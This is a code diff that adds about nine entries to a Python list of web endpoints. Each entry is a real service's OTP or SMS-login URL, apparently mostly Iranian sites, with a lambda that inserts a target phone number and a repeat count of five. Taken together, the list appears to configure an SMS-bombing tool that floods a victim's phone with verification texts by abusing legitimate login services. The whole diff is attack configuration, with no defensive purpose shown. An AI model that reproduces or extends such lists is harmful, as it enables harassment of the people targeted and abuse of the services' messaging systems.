@@ -1012,4 +1012,68 @@ apis = [
         "data": lambda phone: f"sixDigitOTP=true&token=1f94cd26e6ace46d55cb10f0f72d29a0c080a14bdfb366d3c549f5000ce0898e514f9bc240f1b66fbf3cb97b65b74665f991767172e62de48edd47e98421d270&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone={phone}",
         "count": 1
     }
+,
+{
+    "url": "https://janebi.com/signin?do",
+    "method": "POST",
+    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+    "data": lambda phone: f'resend=0{phone}',
+    "count": 5
+},
+{
+    "url": "https://igame.ir/api/play/otp/send",
+    "method": "POST",
+    "headers": {"Content-Type": "application/json"},
+    "data": lambda phone: json.dumps({'phone': '0' + phone}),
+    "count": 5
+},
+{
+    "url": "https://chechilas.com/user/login",
+    "method": "POST",
+    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+    "data": lambda phone: f'mob=0{phone}',
+    "count": 5
+},
+{
+    "url": "https://api.elinorboutique.com/v1/customer/register-login",
+    "method": "POST",
+    "headers": {"Content-Type": "application/json"},
+    "data": lambda phone: json.dumps({'mobile': '0' + phone}),
+    "count": 5
+},
+{
+    "url": "https://ubike.ir/index.php?route=extension/module/websky_otp/send_code",
+    "method": "POST",
+    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+    "data": lambda phone: f'telephone=0{phone}',
+    "count": 5
+},
+{
+    "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
+    "method": "POST",
+    "headers": {"Content-Type": "application/json"},
+    "data": lambda phone: json.dumps({'cellphone': '0' + phone}),
+    "count": 5
+},
+{
+    "url": "https://api.digighate.com/v2/public/code?phone={phone}",
+    "method": "GET",
+    "headers": {},
+    "data": None,
+    "count": 5
+},
+{
+    "url": "https://www.kanoonbook.ir/store/customer_otp",
+    "method": "POST",
+    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+    "data": lambda phone: f'customer_username={phone}&task=customer_phone',
+    "count": 5
+},
+{
+    "url": "https://sso-service.ketab.ir/api/v2/signup/otp?Mobile=0{phone}&OtpSmsType=1",
+    "method": "GET",
+    "headers": {},
+    "data": None,
+    "count": 5
+}
 ]
